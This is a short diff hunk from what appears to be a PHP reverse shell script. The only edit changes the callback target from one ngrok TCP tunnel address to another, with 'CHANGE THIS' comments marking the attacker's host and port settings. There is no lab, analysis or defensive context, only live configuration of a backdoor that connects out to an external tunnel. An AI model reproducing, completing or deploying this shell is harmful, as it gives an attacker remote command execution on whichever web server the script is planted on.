@@ -2,7 +2,7 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'tcp://5.tcp.eu.ngrok.io:19648';  // CHANGE THIS
+$ip = 'tcp://2.tcp.eu.ngrok.io:19190';  // CHANGE THIS
 $port = 3333;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
